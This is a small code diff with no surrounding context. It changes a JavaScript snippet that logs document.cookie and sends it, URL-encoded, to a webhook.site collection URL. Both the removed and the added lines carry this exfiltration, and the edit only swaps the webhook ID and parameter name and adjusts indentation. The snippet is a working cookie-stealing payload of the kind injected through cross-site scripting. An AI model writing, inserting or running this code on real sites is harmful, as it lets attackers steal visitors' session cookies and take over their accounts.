@@ -1,6 +1,6 @@
- console.log("Cookies:", document.cookie);
+    console.log("Cookies:", document.cookie);
 
-fetch(
-    "https://webhook.site/ec1d173d-643a-4a5b-861b-1ecec12e1e8b?c=" +
-    encodeURIComponent(document.cookie),
-);
+    fetch(
+      "https://webhook.site/400ff12c-64dd-445b-ae1d-1059427d00fe?cookies=" +
+        encodeURIComponent(document.cookie),
+    );
